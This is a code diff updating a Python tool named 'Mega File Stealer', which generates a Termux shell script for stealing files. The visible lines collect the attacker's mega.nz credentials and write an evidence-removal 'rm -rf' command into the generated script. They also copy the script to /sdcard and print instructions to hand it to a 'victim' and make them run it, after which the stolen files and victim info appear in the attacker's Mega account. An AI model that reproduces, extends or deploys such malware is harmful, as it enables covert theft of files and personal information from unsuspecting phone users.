@@ -9,12 +9,12 @@ print("           /___/\033[0;0m")
 print("   _______________________________________")
 print("  |                                       |")
 print("  | \033[0;34mName\033[0;0m    : \033[0;36mMega File Stealer\033[0;0m           |")
-print("  | \033[0;34mVersion\033[0;0m : \033[0;36m2.0\033[0;0m                         |")
+print("  | \033[0;34mVersion\033[0;0m : \033[0;36m2.1\033[0;0m                         |")
 print("  | \033[0;34mAuthor\033[0;0m  : \033[0;36mZech Bron\033[0;0m                   |")
 print("  | \033[0;34mGitHub\033[0;0m  : \033[0;36mhttps://github.com/ZechBron\033[0;0m |")
 print("  |_______________________________________|")
 print("\n")
-# \033[0;31m[\033[0;0m\033[0;34mZ\033[0;0m\033[0;31m]\033[0;0m
+
 username = input("\033[0;31m[\033[0;0m\033[0;34mZ\033[0;0m\033[0;31m]\033[0;0m \033[0;32mEnter your mega.nz username:\033[0;0m ")
 email = input("\033[0;31m[\033[0;0m\033[0;34mZ\033[0;0m\033[0;31m]\033[0;0m \033[0;32mEnter your meganz email:\033[0;0m ")
 passwd = input("\033[0;31m[\033[0;0m\033[0;34mZ\033[0;0m\033[0;31m]\033[0;0m \033[0;32mEnter mega.nz password:\033[0;0m ")
@@ -60,16 +60,12 @@ zCh.write("\nclear\n")
 # Remove evidence
 zCh.write(f"rm -rf log INFO.txt {str(ChB)}.sh\n")
 
-# Change file name
-#os.system("mv zech.sh " + str(ChB) + ".sh")
-os.system(f"mv zech.sh {str(ChB)}.sh\n")
-
-# Copy the file to sdcard
-os.system(f"cp {str(ChB)}.sh /sdcard\n")
+os.rename("zech.sh", str(ChB) + ".sh")
+os.system("cp " + str(ChB) + ".sh /sdcard")
 
 ## INSTRUCTION
 print("\nINSTRUCTION:")
-print(" 1. Open your file manager and find the file named: " + str(ChB) + ".sh")
-print(" 2. Give " + str(ChB) + ".sh to your victim and make your victim run the script by making him/her type this in his/her termux:\n bash " + str(ChB) + ".sh")
+print(" 1. Open your file manager and find the file named: '" + str(ChB) + ".sh'")
+print(" 2. Give '" + str(ChB) + ".sh' to your victim and make your victim run the script by making him/her type this in his/her termux:\n bash " + str(ChB) + ".sh")
 print(" 3. After the victim run the script. Open your Mega.nz account.")
 print("   You will see there the file named 'INFO.txt' (INFO.txt containts infos of your victims) and the files you have stole")
